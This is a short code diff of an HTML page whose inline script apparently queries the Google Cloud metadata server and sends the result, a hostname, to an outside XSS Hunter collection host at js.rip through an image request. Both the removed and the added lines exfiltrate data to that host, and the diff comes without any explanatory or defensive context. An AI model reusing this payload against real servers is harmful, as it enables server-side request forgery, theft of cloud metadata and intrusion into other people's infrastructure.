@@ -8,12 +8,11 @@
       headers: { "Metadata-Flavor": "Google" }
     })
     .then(r => r.text())
-    .then(t => {
-      new Image().src = "https://xss.js.rip/5mw8at9w5s/" + btoa(t);
-    })
-    .catch(() => {
-      new Image().src = "https://xss.js.rip/5mw8at9w5s/error";
+    .then(hostname => {
+      // Send raw hostname as query param so it shows in XSS Hunter logs
+      new Image().src = "https://js.rip/5mw8at9w5s?leaked=" + encodeURIComponent(hostname);
     });
+    // No .catch — if fetch fails, only the script load fires
   </script>
 </head>
 <body>
